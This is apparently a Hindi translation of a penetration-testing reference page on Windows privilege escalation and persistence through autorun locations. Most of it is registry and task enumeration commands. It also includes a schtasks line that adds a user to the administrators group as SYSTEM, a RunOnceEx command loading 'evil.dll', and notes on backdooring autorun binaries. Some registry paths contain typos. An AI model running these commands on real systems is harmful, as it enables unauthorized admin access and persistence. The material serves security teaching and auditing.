# Autoruns के साथ विशेषाधिकार वृद्धि

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** का उपयोग **स्टार्टअप** पर प्रोग्राम चलाने के लिए किया जा सकता है। यह देखने के लिए कि कौन से बाइनरी स्टार्टअप पर चलाने के लिए प्रोग्रामित हैं:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Scheduled Tasks

**कार्य** को **विशिष्ट आवृत्ति** के साथ चलाने के लिए निर्धारित किया जा सकता है। देखें कि कौन से बाइनरी चलाने के लिए निर्धारित हैं:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

सभी बाइनरी जो **Startup folders में स्थित हैं, स्टार्टअप पर निष्पादित होने जा रही हैं**। सामान्य स्टार्टअप फोल्डर वे हैं जो आगे सूचीबद्ध हैं, लेकिन स्टार्टअप फोल्डर रजिस्ट्री में निर्दिष्ट है। [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Registry

> [!NOTE]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): **Wow6432Node** रजिस्ट्री प्रविष्टि यह संकेत करती है कि आप 64-बिट Windows संस्करण चला रहे हैं। ऑपरेटिंग सिस्टम इस कुंजी का उपयोग 64-बिट Windows संस्करणों पर चलने वाले 32-बिट अनुप्रयोगों के लिए HKEY_LOCAL_MACHINE\SOFTWARE का एक अलग दृश्य प्रदर्शित करने के लिए करता है।

### Runs

**सामान्यतः ज्ञात** AutoRun रजिस्ट्री:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

**Run** और **RunOnce** के रूप में ज्ञात रजिस्ट्री कुंजियाँ हर बार जब एक उपयोगकर्ता सिस्टम में लॉग इन करता है, तो स्वचालित रूप से कार्यक्रमों को निष्पादित करने के लिए डिज़ाइन की गई हैं। कुंजी के डेटा मान के रूप में असाइन की गई कमांड लाइन 260 वर्णों या उससे कम तक सीमित है।

**Service runs** (बूट के दौरान सेवाओं के स्वचालित प्रारंभ को नियंत्रित कर सकते हैं):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Windows Vista और बाद के संस्करणों पर, **Run** और **RunOnce** रजिस्ट्री कुंजियाँ स्वचालित रूप से उत्पन्न नहीं होती हैं। इन कुंजियों में प्रविष्टियाँ या तो सीधे कार्यक्रमों को प्रारंभ कर सकती हैं या उन्हें निर्भरताओं के रूप में निर्दिष्ट कर सकती हैं। उदाहरण के लिए, लॉगिन पर एक DLL फ़ाइल लोड करने के लिए, कोई **RunOnceEx** रजिस्ट्री कुंजी का उपयोग कर सकता है साथ ही एक "Depend" कुंजी। यह "C:\temp\evil.dll" को सिस्टम स्टार्ट-अप के दौरान निष्पादित करने के लिए रजिस्ट्री प्रविष्टि जोड़कर प्रदर्शित किया गया है:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!NOTE]
> **Exploit 1**: यदि आप **HKLM** के अंदर किसी भी उल्लेखित रजिस्ट्री के अंदर लिख सकते हैं, तो आप तब विशेषाधिकार बढ़ा सकते हैं जब कोई अन्य उपयोगकर्ता लॉग इन करता है।

> [!NOTE]
> **Exploit 2**: यदि आप **HKLM** के अंदर किसी भी रजिस्ट्री पर संकेतित किसी भी बाइनरी को ओवरराइट कर सकते हैं, तो आप उस बाइनरी को एक बैकडोर के साथ संशोधित कर सकते हैं जब कोई अन्य उपयोगकर्ता लॉग इन करता है और विशेषाधिकार बढ़ा सकते हैं।
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

**Startup** फ़ोल्डर में रखे गए शॉर्टकट उपयोगकर्ता लॉगिन या सिस्टम रिबूट के दौरान सेवाओं या अनुप्रयोगों को स्वचालित रूप से लॉन्च करने के लिए ट्रिगर करेंगे। **Startup** फ़ोल्डर का स्थान रजिस्ट्री में **Local Machine** और **Current User** स्कोप के लिए परिभाषित है। इसका मतलब है कि इन निर्दिष्ट **Startup** स्थानों में जोड़ा गया कोई भी शॉर्टकट सुनिश्चित करेगा कि लिंक की गई सेवा या प्रोग्राम लॉगिन या रिबूट प्रक्रिया के बाद शुरू हो जाए, जिससे प्रोग्राम को स्वचालित रूप से चलाने के लिए एक सीधा तरीका बनता है।

> [!NOTE]
> यदि आप **HKLM** के तहत किसी भी \[User] Shell Folder को ओवरराइट कर सकते हैं, तो आप इसे एक फ़ोल्डर की ओर इंगित कर सकते हैं जिसे आप नियंत्रित करते हैं और एक बैकडोर रख सकते हैं जो किसी भी समय उपयोगकर्ता के सिस्टम में लॉग इन करने पर निष्पादित होगा, जिससे विशेषाधिकार बढ़ेंगे।
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

आमतौर पर, **Userinit** कुंजी **userinit.exe** पर सेट होती है। हालाँकि, यदि इस कुंजी को संशोधित किया जाता है, तो निर्दिष्ट निष्पादन योग्य फ़ाइल **Winlogon** द्वारा उपयोगकर्ता लॉगिन पर भी लॉन्च की जाएगी। इसी तरह, **Shell** कुंजी **explorer.exe** की ओर इशारा करने के लिए होती है, जो Windows के लिए डिफ़ॉल्ट शेल है।
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!NOTE]
> यदि आप रजिस्ट्री मान या बाइनरी को ओवरराइट कर सकते हैं, तो आप विशेषाधिकार बढ़ा सकेंगे।

### नीति सेटिंग्स

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

**Run** कुंजी की जांच करें।
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Safe Mode Command Prompt बदलना

Windows Registry में `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` के तहत, एक **`AlternateShell`** मान डिफ़ॉल्ट रूप से `cmd.exe` पर सेट है। इसका मतलब है कि जब आप स्टार्टअप के दौरान "Safe Mode with Command Prompt" चुनते हैं (F8 दबाकर), `cmd.exe` का उपयोग किया जाता है। लेकिन, यह संभव है कि आप अपने कंप्यूटर को इस मोड में स्वचालित रूप से शुरू करने के लिए सेट करें बिना F8 दबाए और मैन्युअल रूप से इसे चुनें।

"Safe Mode with Command Prompt" में स्वचालित रूप से शुरू करने के लिए बूट विकल्प बनाने के चरण:

1. `boot.ini` फ़ाइल के गुणों को बदलें ताकि पढ़ने-के-लिए-केवल, सिस्टम, और छिपे हुए ध्वज हटा दिए जाएं: `attrib c:\boot.ini -r -s -h`
2. संपादन के लिए `boot.ini` खोलें।
3. एक पंक्ति डालें जैसे: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. `boot.ini` में परिवर्तन सहेजें।
5. मूल फ़ाइल गुणों को फिर से लागू करें: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** **AlternateShell** रजिस्ट्री कुंजी को बदलने से कस्टम कमांड शेल सेटअप की अनुमति मिलती है, संभावित रूप से अनधिकृत पहुंच के लिए।
- **Exploit 2 (PATH Write Permissions):** सिस्टम **PATH** वेरिएबल के किसी भी भाग पर लिखने की अनुमति होना, विशेष रूप से `C:\Windows\system32` से पहले, आपको एक कस्टम `cmd.exe` निष्पादित करने की अनुमति देता है, जो यदि सिस्टम Safe Mode में शुरू होता है तो एक बैकडोर हो सकता है।
- **Exploit 3 (PATH और boot.ini Write Permissions):** `boot.ini` पर लिखने की पहुंच स्वचालित Safe Mode स्टार्टअप को सक्षम बनाती है, अगली रिबूट पर अनधिकृत पहुंच को सुविधाजनक बनाती है।

वर्तमान **AlternateShell** सेटिंग की जांच करने के लिए, इन कमांड का उपयोग करें:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup एक फीचर है Windows में जो **डेस्कटॉप वातावरण पूरी तरह से लोड होने से पहले शुरू होता है**। यह कुछ कमांड्स के निष्पादन को प्राथमिकता देता है, जिन्हें उपयोगकर्ता लॉगिन से पहले पूरा करना आवश्यक है। यह प्रक्रिया अन्य स्टार्टअप प्रविष्टियों, जैसे कि रन या रनओन्स रजिस्ट्री सेक्शन में, सक्रिय होने से पहले होती है।

Active Setup निम्नलिखित रजिस्ट्री कुंजियों के माध्यम से प्रबंधित किया जाता है:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

इन कुंजियों के भीतर, विभिन्न उपकुंजियाँ मौजूद हैं, प्रत्येक एक विशिष्ट घटक के लिए। विशेष रुचि के कुंजी मानों में शामिल हैं:

- **IsInstalled:**
- `0` इंगित करता है कि घटक का कमांड निष्पादित नहीं होगा।
- `1` का अर्थ है कि कमांड प्रत्येक उपयोगकर्ता के लिए एक बार निष्पादित होगा, जो कि डिफ़ॉल्ट व्यवहार है यदि `IsInstalled` मान गायब है।
- **StubPath:** Active Setup द्वारा निष्पादित किए जाने वाले कमांड को परिभाषित करता है। यह किसी भी मान्य कमांड लाइन हो सकता है, जैसे कि `notepad` लॉन्च करना।

**Security Insights:**

- एक कुंजी को संशोधित करना या उसमें लिखना जहां **`IsInstalled`** `"1"` पर सेट है और एक विशिष्ट **`StubPath`** के साथ, अनधिकृत कमांड निष्पादन का कारण बन सकता है, संभावित रूप से विशेषाधिकार वृद्धि के लिए।
- किसी भी **`StubPath`** मान में संदर्भित बाइनरी फ़ाइल को बदलना भी विशेषाधिकार वृद्धि प्राप्त कर सकता है, यदि पर्याप्त अनुमतियाँ हों।

Active Setup घटकों के बीच **`StubPath`** कॉन्फ़िगरेशन की जांच करने के लिए, इन कमांड्स का उपयोग किया जा सकता है:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Browser Helper Objects (BHOs) का अवलोकन

Browser Helper Objects (BHOs) DLL मॉड्यूल हैं जो Microsoft's Internet Explorer में अतिरिक्त सुविधाएँ जोड़ते हैं। ये Internet Explorer और Windows Explorer में प्रत्येक स्टार्ट पर लोड होते हैं। फिर भी, इनका निष्पादन **NoExplorer** कुंजी को 1 सेट करके रोका जा सकता है, जिससे ये Windows Explorer उदाहरणों के साथ लोड नहीं होते हैं।

BHOs Windows 10 के साथ Internet Explorer 11 के माध्यम से संगत हैं लेकिन Microsoft Edge, जो नए संस्करणों में डिफ़ॉल्ट ब्राउज़र है, में समर्थित नहीं हैं।

सिस्टम पर पंजीकृत BHOs का अन्वेषण करने के लिए, आप निम्नलिखित रजिस्ट्री कुंजियों की जांच कर सकते हैं:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

प्रत्येक BHO को रजिस्ट्री में इसके **CLSID** द्वारा दर्शाया जाता है, जो एक अद्वितीय पहचानकर्ता के रूप में कार्य करता है। प्रत्येक CLSID के बारे में विस्तृत जानकारी `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` के तहत मिल सकती है।

रजिस्ट्री में BHOs को क्वेरी करने के लिए, इन कमांड का उपयोग किया जा सकता है:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

ध्यान दें कि रजिस्ट्री में प्रत्येक dll के लिए 1 नया रजिस्ट्री होगा और इसे **CLSID** द्वारा दर्शाया जाएगा। आप CLSID जानकारी `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` में पा सकते हैं।

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### इमेज फ़ाइल निष्पादन विकल्प
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

ध्यान दें कि सभी साइटें जहां आप autoruns पा सकते हैं, **पहले से ही खोजी गई हैं**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)। हालाँकि, **स्वचालित रूप से निष्पादित** फ़ाइलों की **अधिक व्यापक सूची** के लिए आप systinternals से [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) का उपयोग कर सकते हैं:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**Autoruns जैसे और खोजें जो रजिस्ट्रियों में हैं** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)



{{#include ../../banners/hacktricks-training.md}}
